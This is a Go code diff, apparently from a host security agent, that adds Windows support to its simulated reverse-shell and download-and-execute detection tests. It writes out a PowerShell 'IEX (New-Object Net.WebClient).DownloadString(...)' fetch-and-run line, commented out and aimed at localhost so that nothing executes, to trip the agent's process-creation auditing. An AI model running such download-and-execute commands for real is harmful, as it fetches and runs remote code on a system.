@@ -209,6 +209,9 @@ func startShell(script string, stdio *os.File) (int, error) {
 // simReverseShell 让 shell 的输入输出连接到 Agent 自己在本机建立的 TCP 连接：结构上与反弹 shell 相同，
 // 但对端是 Agent 自己，不会收到任何命令。
 func (a *Agent) simReverseShell(id string) (string, error) {
+	if runtime.GOOS == "windows" {
+		return "Windows 暂无此场景", nil
+	}
 	if !a.hasCapability("exec_monitor") {
 		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
 	}
@@ -250,6 +253,18 @@ func (a *Agent) simReverseShell(id string) (string, error) {
 
 // simDownloadExec 执行含"curl … | sh"字样的命令：":" 是 shell 的空操作，实际不下载也不执行。
 func (a *Agent) simDownloadExec(id string) (string, error) {
+	if runtime.GOOS == "windows" {
+		if !a.hasCapability("exec_monitor") {
+			return "进程创建审计（安全日志 4688）未生效：用一键安装脚本安装，或开启“审核进程创建”和命令行记录", nil
+		}
+		// "#" 之后是 PowerShell 注释：命令行含下载执行的特征，实际什么也不执行
+		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command",
+			fmt.Sprintf("# IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:9/safe-sim-%s')", id))
+		if out, err := cmd.CombinedOutput(); err != nil {
+			return "", fmt.Errorf("测试命令执行失败（%v）：%s", err, strings.TrimSpace(string(out)))
+		}
+		return "", nil
+	}
 	if !a.hasCapability("exec_monitor") {
 		return "命令审计未启用（需要 Linux 且以 root 运行）", nil
 	}
